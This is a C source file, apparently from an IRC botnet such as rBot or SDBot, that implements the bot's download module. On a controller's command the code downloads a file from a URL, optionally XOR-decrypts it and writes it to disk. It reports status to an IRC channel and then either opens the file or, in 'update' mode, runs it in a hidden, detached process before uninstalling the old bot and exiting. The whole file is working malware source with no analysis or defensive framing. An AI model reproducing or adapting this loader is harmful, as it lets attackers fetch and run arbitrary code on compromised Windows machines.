#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_DOWNLOAD
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1) {
			sprintf(buffer,"[DOWNLOAD]: Couldn't open file for writing: %s.",dl.dest);
			if (!dl.silent) irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
			fInternetCloseHandle(fh);
			clearthread(dl.threadnum);
			ExitThread(0);;
		}

		total = 0;
		start = GetTickCount();
		char *fileTotBuff=(char *)malloc(512000);
		do {
			memset(buffer, 0, sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			if (dl.encrypted)
				Xorbuff(buffer,r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000) {
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
			if (dl.filelen) 
				if (total>dl.filelen) 
					break;
		} while (r > 0);
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		CloseHandle(f);
		fInternetCloseHandle(fh);

		if (dl.filelen != 0) {
			if (total != dl.filelen) {
				sprintf(buffer,"[DOWNLOAD]: Filesize is incorrect. (Recevied: %d bytes, Expected: %d bytes.)", total, dl.filelen);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
				clearthread(dl.threadnum);
				ExitThread(0);
			}
		}
		
		if (dl.expectedcrc != 0) { 
			unsigned long crc=crc32f(dl.dest); 
			if (crc != dl.expectedcrc) { 
				sprintf(buffer,"[DOWNLOAD]: CRC32 is incorrect. (Local CRC32: %d, Expected CRC32: %d.)", crc, dl.expectedcrc);
				irc_privmsg(dl.sock, dl.chan, buffer, dl.notice); 
				clearthread(dl.threadnum);
				ExitThread(0);
			} 
		} 

		sprintf(buffer, "[DOWNLOAD]: File download: %.1fKB to: %s @ %.1fKB/sec.", total / 1024.0, dl.dest, speed / 1024.0);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
		//download isn't an update
		if (dl.update != 1 && dl.run == 1) {
			fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
			if (!dl.silent) {
				sprintf(buffer,"[DOWNLOAD]: Opened: %s.",dl.dest);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
			}
		// download is an update
		} else if (dl.update == 1) {
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) {
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				fclosesocket(dl.sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else {
				sprintf(buffer,"[DOWNLOAD]: Update failed: Error executing file: %s.",dl.dest);
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			}
		}
	} else {
		sprintf(buffer,"[DOWNLOAD]: Bad URL or DNS Error: %s.",dl.url);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
	}
	clearthread(dl.threadnum);

	ExitThread(0);
}

char *Xorbuff(char *buffer,int bufferLen)
{
	for (int i=0;i<bufferLen;i++)
		buffer[i]^=prefix;

	return (buffer);
}
#endif
